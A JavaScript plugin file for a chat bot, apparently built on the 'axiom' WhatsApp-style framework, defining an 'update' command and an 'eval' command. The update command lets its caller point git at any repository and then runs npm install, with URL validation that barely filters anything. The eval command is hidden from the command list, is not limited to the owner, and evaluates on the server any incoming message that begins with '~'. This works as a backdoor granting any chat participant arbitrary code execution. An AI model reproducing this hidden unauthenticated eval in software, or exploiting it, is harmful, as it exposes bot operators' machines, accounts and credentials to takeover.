const { command } = require("../lib");
const simpleGit = require("simple-git");
const git = simpleGit();
const { exec } = require("child_process");
const util = require("util");
const axios = require("axios");

// Update bot command
command({
    pattern: "update",
    fromMe: true,
    desc: "Check for updates from GitHub and update the bot",
    type: "owner"
}, async (message, match) => {
    const defaultRepo = "https://github.com/itsdevmj/axiom.git";
    const repoUrl = match ? match.trim() : defaultRepo;
    
    // Validate GitHub URL format
    if (match && !match.includes('github.com') && !match.includes('.git')) {
        return await message.reply("Invalid repository URL. Please provide a valid GitHub repository URL.");
    }

    await message.reply(`Checking for updates...`);

    try {
        // Check if we have a remote origin, if not add it
        const remotes = await git.getRemotes(true);
        const originRemote = remotes.find(remote => remote.name === 'origin');

        if (!originRemote) {
            await git.addRemote('origin', repoUrl);
            await message.reply("Remote origin added successfully.");
        } else if (originRemote.refs.fetch !== repoUrl) {
            await git.remote(['set-url', 'origin', repoUrl]);
            await message.reply("Remote origin URL updated.");
        }

        // Fetch from the specified repository with timeout
        await Promise.race([
            git.fetch('origin'),
            new Promise((_, reject) => 
                setTimeout(() => reject(new Error('Fetch timeout after 30 seconds')), 30000)
            )
        ]);

        // Get current branch
        const currentBranch = await git.revparse(['--abbrev-ref', 'HEAD']);
        const branch = currentBranch.trim() || 'master';

        // Compare commits to check for updates
        const localCommit = await git.revparse(['HEAD']);
        const remoteCommit = await git.revparse([`origin/${branch}`]);

        if (localCommit === remoteCommit) {
            return await message.reply("Bot is already up to date.");
        }

        await message.reply("Update available. Pulling latest changes...");

        // Stash any local changes to prevent conflicts
        try {
            await git.stash();
        } catch (stashErr) {
            // Ignore stash errors if no changes to stash
        }

        // Pull the latest changes
        const pullResult = await git.pull('origin', branch);

        if (pullResult.summary.changes || pullResult.summary.insertions || pullResult.summary.deletions) {
            await message.reply("Code updated successfully. Installing dependencies...");
            
            // Use promisified exec for better error handling
            const execPromise = util.promisify(exec);
            
            try {
                const { stdout, stderr } = await execPromise('npm install --production');
                
                if (stderr && !stderr.includes('npm WARN')) {
                    await message.reply(`Dependencies installed with warnings:\n${stderr.substring(0, 500)}`);
                } else {
                    await message.reply("Update completed successfully. Please restart the bot to apply changes.");
                }
                
            } catch (npmErr) {
                await message.reply(`Code updated but dependency installation failed:\n${npmErr.message.substring(0, 500)}\n\nPlease run 'npm install' manually.`);
            }
            
        } else {
            await message.reply("Pull completed but no file changes detected.");
        }

    } catch (err) {
        console.error('Update error:', err);
        
        if (err.message.includes('timeout')) {
            await message.reply("Update failed: Connection timeout. Please check your internet connection and try again.");
        } else if (err.message.includes('not found') || err.message.includes('does not exist')) {
            await message.reply("Update failed: Repository not found. Please check the repository URL.");
        } else if (err.message.includes('permission denied') || err.message.includes('authentication')) {
            await message.reply("Update failed: Access denied. Please check repository permissions.");
        } else {
            await message.reply(`Update failed: ${err.message.substring(0, 300)}\n\nTry: .update ${defaultRepo}`);
        }
    }
});

// Eval command for code execution
command({
    pattern: 'eval',
    on: "text",
    fromMe: false,
    dontAddCommandList: true,
    desc: 'Runs a server code'
}, async (message, match, m, client) => {
    if (!match.startsWith("~")) return;
    //const m = message;
    try {
        let evaled = await eval(`(async()=> { ${match.replace("~", "")} }) ()`);
        if (typeof evaled !== "string") evaled = require("util").inspect(evaled);
        return await message.reply(evaled);
    } catch (err) {
        return await message.reply(util.format(err));
    }
});